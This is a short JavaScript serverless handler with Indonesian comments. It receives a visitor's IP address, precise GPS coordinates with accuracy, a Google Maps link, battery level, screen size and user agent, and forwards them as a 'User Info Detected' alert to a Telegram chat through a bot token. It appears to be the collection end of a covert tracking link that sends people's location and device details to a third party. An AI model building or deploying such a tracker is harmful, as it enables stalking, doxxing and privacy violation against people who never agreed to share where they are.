export async function handler(event, context) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const body = JSON.parse(event.body);

        // Format pesan
        const message = `
📲 *User Info Detected*

🕐 Time: ${body.localTime}

🆔 ID: ${body.userId} (new user: ${body.newUser})

🌐 IP: ${body.userIP}

📍 Location:
  - GMaps Link: [Google Maps](${body.gmapsLink})
  - Latitude: ${body.latitude}
  - Longitude: ${body.longitude}
  - Accuracy: ${body.accuracy} meters

📱 Device Info:
  - Battery level: ${body.batteryLevel}
  - Screen: ${body.screenWidth}x${body.screenHeight}
  - Pixel Ratio: ${body.pixelRatio}
  - User Agent: \`\`\`${body.userAgent}\`\`\`
`;

        // Kirim ke Telegram
        const res = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "Markdown",
                    disable_web_page_preview: true,
                }),
            }
        );

        return {
            statusCode: 200,
            body: JSON.stringify({ ok: true }),
        };
    } catch (err) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: err.message }),
        };
    }
}
